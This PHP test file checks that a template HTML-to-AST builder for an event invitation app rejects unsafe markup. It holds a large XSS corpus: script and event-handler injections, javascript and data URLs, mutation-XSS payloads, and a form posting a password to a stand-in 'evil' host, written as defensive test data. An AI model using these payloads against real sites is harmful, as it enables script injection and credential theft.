<?php

use App\Support\TemplatePackage\HtmlAstBuilder;
use App\Support\TemplatePackage\Report;

const ASSETS = ['assets/img/a.webp', 'assets/img/b.svg'];

/** @return array{0: ?array, 1: list<string>, 2: Report} */
function ast(string $html, string $kind = 'section', ?string $type = 'cover'): array
{
    $report = new Report;
    $out = (new HtmlAstBuilder)->build($html, $kind === 'layout' ? 'layout.html' : "sections/{$type}.html", $kind, $kind === 'layout' ? null : $type, ASSETS, $report);

    return [$out, $report->errorCodes(), $report];
}

/** Walks an AST and fails on anything outside the closed schema (defence in depth for what the app renders). */
function assertInert(array $nodes): void
{
    $tags = ['div', 'span', 'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'a', 'img', 'figure', 'figcaption', 'blockquote', 'section', 'header', 'footer', 'nav', 'article', 'aside', 'hr', 'br', 'em', 'strong', 'b', 'i', 'u', 's', 'small', 'sub', 'sup', 'mark', 'time', 'address', 'dl', 'dt', 'dd'];
    foreach ($nodes as $n) {
        match ($n['t']) {
            'text' => expect(array_keys($n))->toBe(['t', 'v']),
            'var' => expect(array_keys($n))->toBe(['t', 'path', 'filter']),
            'el' => (function () use ($n, $tags) {
                expect($tags)->toContain($n['tag']);
                foreach ((array) $n['attrs'] as $name => $value) {
                    expect($name)->not->toStartWith('on')->and($name)->not->toBe('style')->and($name)->not->toBe('srcdoc');
                    $flat = json_encode($value);
                    expect($flat)->not->toMatch('/javascript:|data:|vbscript:/i');
                }
                assertInert($n['children']);
            })(),
            'q' => expect($n['children'])->toBe([]),
            'if' => (function () use ($n) {
                expect(array_keys($n))->toBe(['t', 'path', 'children']);
                assertInert($n['children']);
            })(),
        };
    }
}

// --- the classic XSS corpus: every vector must be rejected (none may reach the AST) -------------------------------------
$xss = [
    'script tag' => '<script>alert(1)</script>',
    'script src' => '<script src="//evil/x.js"></script>',
    'script uppercase' => '<SCRIPT>alert(1)</SCRIPT>',
    'script mixed case' => '<ScRiPt>alert(1)</sCrIpT>',
    'script with newline' => "<script\n>alert(1)</script>",
    'img onerror' => '<img src="assets/img/a.webp" alt="" onerror="alert(1)">',
    'img onerror no src' => '<img src="x" onerror="alert(1)" alt="">',
    'img external src' => '<img src="https://evil/x.png" alt="">',
    'img javascript src' => '<img src="javascript:alert(1)" alt="">',
    'img data src' => '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" alt="">',
    'img srcset external' => '<img src="assets/img/a.webp" srcset="https://evil/x.png 2w" alt="">',
    'svg onload' => '<svg onload="alert(1)"></svg>',
    'svg with script' => '<svg><script>alert(1)</script></svg>',
    'svg animate' => '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>',
    'svg use external' => '<svg><use href="//evil/x.svg#a"/></svg>',
    'math xlink' => '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
    'iframe src' => '<iframe src="javascript:alert(1)"></iframe>',
    'iframe srcdoc' => '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    'object data' => '<object data="javascript:alert(1)"></object>',
    'embed src' => '<embed src="data:text/html,<script>alert(1)</script>">',
    'form action' => '<form action="https://evil/steal"><input name="pw"></form>',
    'input autofocus onfocus' => '<input autofocus onfocus="alert(1)">',
    'button formaction' => '<button formaction="javascript:alert(1)">x</button>',
    'link stylesheet' => '<link rel="stylesheet" href="//evil/x.css">',
    'meta refresh' => '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    'base href' => '<base href="//evil/">',
    'style tag' => '<style>@import "//evil/x.css";</style>',
    'style attribute expression' => '<div style="width:expression(alert(1))">x</div>',
    'style attribute url' => '<div style="background:url(javascript:alert(1))">x</div>',
    'a javascript href' => '<a href="javascript:alert(1)">x</a>',
    'a javascript uppercase' => '<a href="JaVaScRiPt:alert(1)">x</a>',
    'a javascript entity' => '<a href="java&#115;cript:alert(1)">x</a>',
    'a javascript hex entity' => '<a href="&#x6A;avascript:alert(1)">x</a>',
    'a javascript with tab' => '<a href="jav&#x09;ascript:alert(1)">x</a>',
    'a javascript with newline' => '<a href="jav&#x0A;ascript:alert(1)">x</a>',
    'a javascript leading space' => '<a href=" javascript:alert(1)">x</a>',
    'a data html' => '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
    'a vbscript' => '<a href="vbscript:msgbox(1)">x</a>',
    'a protocol relative' => '<a href="//evil.com/x">x</a>',
    'a backslash relative' => '<a href="\\\\evil.com\\x">x</a>',
    'a relative path' => '<a href="../../etc/passwd">x</a>',
    'a http (not https)' => '<a href="http://example.com">x</a>',
    'a userinfo phishing' => '<a href="https://google.com@evil.com/">x</a>',
    'a ftp' => '<a href="ftp://evil/x">x</a>',
    'a blob' => '<a href="blob:https://x/uuid">x</a>',
    'a file' => '<a href="file:///etc/passwd">x</a>',
    'a with ping' => '<a href="#rsvp" ping="https://evil/track">x</a>',
    'a with download' => '<a href="https://example.com/x.exe" download>x</a>',
    'a target _top' => '<a href="https://example.com" target="_top">x</a>',
    'onclick' => '<div onclick="alert(1)">x</div>',
    'onmouseover' => '<span onmouseover="alert(1)">x</span>',
    'onfocus tabindex' => '<div tabindex="0" onfocus="alert(1)">x</div>',
    'onanimationstart' => '<div style="animation-name:x" onanimationstart="alert(1)">x</div>',
    'ontoggle details' => '<details open ontoggle="alert(1)">x</details>',
    'on event uppercase' => '<div ONCLICK="alert(1)">x</div>',
    'on event with slash separator' => '<img/src="assets/img/a.webp"/onerror="alert(1)"/alt="">',
    'template' => '<template><script>alert(1)</script></template>',
    'noscript mXSS' => '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    'svg style mXSS' => '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
    'math mglyph mXSS' => '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
    'form nesting mXSS' => '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
    'comment break-out' => '<!--><script>alert(1)</script>-->',
    'comment bang end' => '<!-- x --!><script>alert(1)</script>-->',
    'CDATA' => '<![CDATA[<script>alert(1)</script>]]>',
    'doctype' => '<!DOCTYPE html><div>x</div>',
    'processing instruction' => '<?xml version="1.0"?><div>x</div>',
    'html and body tags' => '<html><body onload="alert(1)">x</body></html>',
    'is attribute' => '<div is="x-evil">x</div>',
    'slot attribute' => '<div slot="x">x</div>',
    'srcdoc on div' => '<div srcdoc="<script>alert(1)</script>">x</div>',
    'name clobbering' => '<img name="cookie" src="assets/img/a.webp" alt="">',
    'id clobbering' => '<a id="location" href="#rsvp">x</a>',
    'id with __proto__' => '<div id="__proto__">x</div>',
    'reserved class' => '<div class="inv-rsvp">x</div>',
    'video poster' => '<video poster="javascript:alert(1)"></video>',
    'audio onerror' => '<audio src=x onerror=alert(1)></audio>',
    'marquee' => '<marquee onstart="alert(1)">x</marquee>',
    'details' => '<details open><summary>x</summary></details>',
    'dialog' => '<dialog open>x</dialog>',
    'textarea' => '<textarea autofocus onfocus="alert(1)"></textarea>',
    'select' => '<select autofocus onfocus="alert(1)"></select>',
    'label' => '<label for="x">x</label>',
    'unclosed comment' => '<!-- <script>alert(1)</script>',
    'unclosed tag' => '<div class="a',
    'unquoted attribute with script' => '<div class=a onclick=alert(1)>x</div>',
    'backtick attribute' => '<div class=`a` onclick=`alert(1)`>x</div>',
    'null byte in tag' => "<scr\0ipt>alert(1)</script>",
    'null byte in attribute' => "<a href=\"java\0script:alert(1)\">x</a>",
    'var in href' => '<a href="https://example.com/{{ event.name }}">x</a>',
    'var as event handler' => '<div title="{{ event.name }}" onclick="{{ event.name }}">x</div>',
    'template literal injection' => '<p>{{ constructor.constructor("alert(1)")() }}</p>',
    'prototype pollution var' => '<p>{{ __proto__.polluted }}</p>',
    'expression in var' => '<p>{{ event.name + 1 }}</p>',
    'nested braces' => '<p>{{ {{ event.name }} }}</p>',
    'unknown variable' => '<p>{{ user.password }}</p>',
    'unknown filter' => '<p>{{ event.name|safe }}</p>',
    'filter with args' => '<p>{{ event.name|truncate:5 }}</p>',
    'unterminated var' => '<p>{{ event.name </p>',
];

it('rejects the XSS corpus: no vector reaches the AST', function (string $html) {
    [$out, $codes] = ast($html);
    expect($out)->toBeNull()->and($codes)->not->toBe([]);
})->with($xss);

it('has at least 40 adversarial vectors in the corpus', function () use ($xss) {
    expect(count($xss))->toBeGreaterThanOrEqual(40);
});

it('keeps text that merely looks dangerous as inert text', function (string $html, string $expectedText) {
    [$out, $codes] = ast($html);
    expect($codes)->toBe([])->and($out)->not->toBeNull();
    assertInert($out['ast']['nodes']);
    $texts = '';
    array_walk_recursive($out['ast']['nodes'], function ($v, $k) use (&$texts) {
        if ($k === 'v') {
            $texts .= $v;
        }
    });
    expect($texts)->toContain($expectedText);
})->with([
    'escaped script tag' => ['<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>', '<script>alert(1)</script>'],
    'text with javascript word' => ['<p>javascript:alert(1)</p>', 'javascript:alert(1)'],
    'text with onerror word' => ['<p>onerror=alert(1)</p>', 'onerror=alert(1)'],
    'entity soup' => ['<p>&amp;lt;img src=x&amp;gt;</p>', '&lt;img src=x&gt;'],
    'dropped comment' => ['<!-- <b>hidden</b> --><p>ok</p>', 'ok'],
    'conditional comment is just a comment' => ['<!--[if IE]><script>alert(1)</script><![endif]--><p>ok</p>', 'ok'],
    'utf-7 is only text' => ['<p>+ADw-script+AD4-alert(1)+ADw-/script+AD4-</p>', '+ADw-script+AD4-alert(1)'],
    'fullwidth brackets are only text' => ["<p>\u{FF1C}script\u{FF1E}alert(1)</p>", "\u{FF1C}script\u{FF1E}alert(1)"],
]);

it('rejects HTML that two readers interpret differently', function (string $html) {
    [$out, $codes] = ast($html);
    expect($out)->toBeNull()->and($codes)->toContain('html_malformed');
})->with([
    'unclosed p' => ['<p>hello'],
    'p inside p' => ['<p>a<p>b</p></p>'],
    'div inside p (parser auto-closes p)' => ['<p><div>x</div></p>'],
    'nested anchors (adoption agency)' => ['<a href="#rsvp">x<a href="#rsvp">y</a></a>'],
    'li outside list closes' => ['<ul><li>a<li>b</ul>'],
    'mismatched close' => ['<div><span></div></span>'],
    'extra close' => ['<div></div></div>'],
    'uppercase tags' => ['<DIV>x</DIV>'],
    'self closing div' => ['<div/>'],
    'self closing q block' => ['<q-rsvp/>'],
    'duplicate attribute' => ['<div class="a" class="b">x</div>'],
    'unquoted attribute' => ['<div class=a>x</div>'],
    'stray less-than' => ['<div>1 < 2</div>'],
    'attribute without space' => ['<div class="a"id="pkg-x">x</div>'],
    'closing tag with attribute' => ['<div></div class="x">'],
    'closing tag with space' => ['<div></div >'],
]);

it('accepts well-formed documents of the closed dialect', function () {
    $html = '<section class="pkg-hero" id="pkg-hero" data-reveal="rise" data-reveal-delay="200" aria-label="Hola {{ guest.first_name }}">'
        . '<h1>{{ event.name|upper }}</h1><p>{{ section.text }} &amp; {{ event.date|weekday_short }}</p>'
        . '<img src="assets/img/a.webp" alt="{{ event.name }}" width="400" height="300" loading="lazy" srcset="assets/img/a.webp 400w">'
        . '<a href="https://example.com/x?y=1&amp;z=2" target="_blank">link</a> <a href="#rsvp">rsvp</a> <a href="mailto:hola@example.com">m</a> <a href="tel:+13055550123">t</a>'
        . '<ul data-carousel="snap" data-carousel-controls="dots"><li>1</li><li>2</li></ul><div data-parallax="soft"><img src="assets/img/b.svg" alt=""></div>'
        . '<q-names tag="h1" script></q-names><q-date format="ring" weekday="short" month="long" time></q-date><q-cta action="confirm" variant="outline" class="pkg-cta"></q-cta>'
        . '<q-gallery layout="carousel" columns="3" max="12" captions="false"></q-gallery><q-cover-photo aspect="4:5" focus="50% 30%" priority></q-cover-photo>'
        . '<br><hr></section>';
    [$out, $codes, $report] = ast($html);
    expect($codes)->toBe([])->and($out)->not->toBeNull();
    assertInert($out['ast']['nodes']);

    $json = json_encode($out['ast']);
    expect($out['vars'])->toEqualCanonicalizing(['event.name', 'event.date', 'section.text', 'guest.first_name'])
        ->and($out['blocks'])->toMatchArray(['names' => 1, 'date' => 1, 'cta' => 1, 'gallery' => 1, 'cover-photo' => 1])
        ->and($out['assets'])->toEqualCanonicalizing(['assets/img/a.webp', 'assets/img/b.svg'])
        ->and($json)->toContain('"t":"var","path":"event.name","filter":"upper"')
        ->and($json)->toContain('"asset":"assets\/img\/a.webp"');
});

it('represents variables in attribute values as templates and blocks with typed props', function () {
    [$out] = ast('<p title="Hola {{ guest.name|capitalize }}!"><q-gallery columns="3" captions></q-gallery></p>');
    $p = $out['ast']['nodes'][0];
    expect($p['attrs']['title'])->toBe(['tpl' => [['t' => 'text', 'v' => 'Hola '], ['t' => 'var', 'path' => 'guest.name', 'filter' => 'capitalize'], ['t' => 'text', 'v' => '!']]])
        ->and($p['children'][0])->toMatchArray(['t' => 'q', 'name' => 'gallery', 'props' => ['columns' => 3, 'captions' => true]]);
});

it('collapses layout whitespace and keeps single spaces between inline nodes', function () {
    [$out] = ast("<div>\n   <p>a</p>\n   <p>b <b>c</b> <i>d</i></p>\n</div>");
    $div = $out['ast']['nodes'][0];
    expect(count($div['children']))->toBe(2)
        ->and(json_encode($div['children'][1]))->toContain('"v":" "');
});

it('validates block props against their typed specification', function (string $html) {
    [$out, $codes] = ast($html);
    expect($out)->toBeNull()->and($codes)->toContain('block_prop_invalid');
})->with([
    'enum' => ['<q-rsvp variant="evil"></q-rsvp>'],
    'int too big' => ['<q-gallery max="41"></q-gallery>'],
    'int not number' => ['<q-gallery columns="abc"></q-gallery>'],
    'int negative' => ['<q-gallery columns="-1"></q-gallery>'],
    'bool bad' => ['<q-gallery captions="maybe"></q-gallery>'],
    'focus pattern' => ['<q-cover-photo focus="50% 30%; x:y"></q-cover-photo>'],
    'script value' => ['<q-cta action="javascript:alert(1)"></q-cta>'],
]);

it('rejects block misuse', function (string $html, string $kind, ?string $type, string $code) {
    [$out, $codes] = ast($html, $kind, $type);
    expect($out)->toBeNull()->and($codes)->toContain($code);
})->with([
    'unknown block' => ['<q-evil></q-evil>', 'section', 'cover', 'block_unknown'],
    'block with children' => ['<q-rsvp>hola</q-rsvp>', 'section', 'rsvp', 'block_children'],
    'two rsvp' => ['<q-rsvp></q-rsvp><q-rsvp></q-rsvp>', 'section', 'rsvp', 'block_too_many'],
    'rsvp outside the rsvp section' => ['<q-rsvp></q-rsvp>', 'section', 'cover', 'block_scope'],
    'sections outlet in a section' => ['<q-sections></q-sections>', 'section', 'cover', 'block_scope'],
    'rsvp section without rsvp block' => ['<p>hi</p>', 'section', 'rsvp', 'section_block_required'],
    'layout without outlet' => ['<div>x</div>', 'layout', null, 'layout_outlet'],
    'layout with two outlets' => ['<q-sections></q-sections><q-sections></q-sections>', 'layout', null, 'block_too_many'],
    'section variable in layout' => ['<q-sections></q-sections><p>{{ section.title }}</p>', 'layout', null, 'var_unknown'],
    'unknown prop falls to attribute check' => ['<q-countdown flavor="x"></q-countdown>', 'section', 'cover', 'html_attr_forbidden'],
    'aria-hidden around a block' => ['<div aria-hidden="true"><q-music></q-music></div>', 'section', 'cover', 'html_hidden_system_block'],
    'aria-hidden on a block' => ['<q-music aria-hidden="true"></q-music>', 'section', 'cover', 'html_hidden_system_block'],
]);

it('rejects behavior misuse', function (string $html, string $code) {
    [$out, $codes] = ast($html);
    expect($out)->toBeNull()->and($codes)->toContain($code);
})->with([
    'unknown behavior value' => ['<div data-reveal="spin">x</div>', 'html_attr_invalid'],
    'unknown data attribute' => ['<div data-evil="1">x</div>', 'behavior_unknown'],
    'reveal and parallax together' => ['<div data-reveal="fade" data-parallax="soft">x</div>', 'behavior_conflict'],
    'parallax over a system block' => ['<div data-parallax="soft"><q-music></q-music></div>', 'behavior_scope'],
    'carousel over a system block' => ['<ul data-carousel="snap"><q-gallery></q-gallery></ul>', 'behavior_scope'],
    'parallax on a paragraph' => ['<p data-parallax="soft">x</p>', 'behavior_scope'],
    'delay without reveal' => ['<div data-reveal-delay="200">x</div>', 'behavior_scope'],
    'arbitrary delay' => ['<div data-reveal="fade" data-reveal-delay="99999">x</div>', 'html_attr_invalid'],
    'controls without carousel' => ['<ul data-carousel-controls="dots"><li>1</li></ul>', 'behavior_scope'],
]);

it('limits assets references to existing files and requires alt', function (string $html, string $code) {
    [$out, $codes] = ast($html);
    expect($out)->toBeNull()->and($codes)->toContain($code);
})->with([
    'missing asset' => ['<img src="assets/img/zz.webp" alt="">', 'html_url_forbidden'],
    'traversal' => ['<img src="assets/../manifest.json" alt="">', 'html_url_forbidden'],
    'double slash' => ['<img src="assets//img/a.webp" alt="">', 'html_url_forbidden'],
    'uppercase path' => ['<img src="assets/IMG/a.webp" alt="">', 'html_url_forbidden'],
    'no alt' => ['<img src="assets/img/a.webp">', 'img_alt_missing'],
    'width out of range' => ['<img src="assets/img/a.webp" alt="" width="99999">', 'html_attr_invalid'],
    'loading bad' => ['<img src="assets/img/a.webp" alt="" loading="x">', 'html_attr_invalid'],
]);

it('warns when an image has no intrinsic size', function () {
    [$out, , $report] = ast('<img src="assets/img/a.webp" alt="">');
    expect($out)->not->toBeNull()->and($report->warningCodes())->toBe(['img_size_missing']);
});

it('limits depth, node count and size', function () {
    [$deepOut, $deepCodes] = ast(str_repeat('<div>', 25) . str_repeat('</div>', 25));
    expect($deepOut)->toBeNull()->and($deepCodes)->toContain('html_too_deep');

    [$okOut] = ast(str_repeat('<div>', 24) . 'x' . str_repeat('</div>', 24));
    expect($okOut)->not->toBeNull();

    [$bombOut, $bombCodes] = ast(str_repeat('<div>', 100_000));
    expect($bombOut)->toBeNull()->and($bombCodes)->toContain('file_too_large');

    [$wideOut, $wideCodes] = ast(str_repeat('<span>x</span>', 1600));
    expect($wideOut)->toBeNull()->and($wideCodes)->toContain('html_too_big');
});

it('processes pathological inputs quickly (no catastrophic backtracking)', function (string $html) {
    $t = microtime(true);
    ast($html);
    expect(microtime(true) - $t)->toBeLessThan(1.0);
})->with([
    'many spaces in tag' => ['<div' . str_repeat(' ', 50000) . '>x</div>'],
    'many attributes' => ['<div ' . implode(' ', array_map(fn ($i) => "a{$i}=\"x\"", range(1, 3000))) . '>x</div>'],
    'long attribute value' => ['<div title="' . str_repeat('a', 60000) . '">x</div>'],
    'many braces' => ['<p>' . str_repeat('{{', 20000) . '</p>'],
    'many comments' => [str_repeat('<!-- a -->', 5000) . '<p>x</p>'],
    'many dashes in comment' => ['<!--' . str_repeat('-', 60000) . '-->'],
    'entity flood' => ['<p>' . str_repeat('&amp;', 10000) . '</p>'],
]);

it('rejects invalid encodings and control characters', function (string $html) {
    [$out, $codes] = ast($html);
    expect($out)->toBeNull()->and($codes)->toContain('html_malformed');
})->with([
    'invalid utf8' => ["<p>\xFF\xFE</p>"],
    'NUL' => ["<p>a\0b</p>"],
    'bidi override' => ["<p>a\u{202E}b</p>"],
    'form feed in attribute' => ["<p title=\"a\x0Cb\">x</p>"],
]);
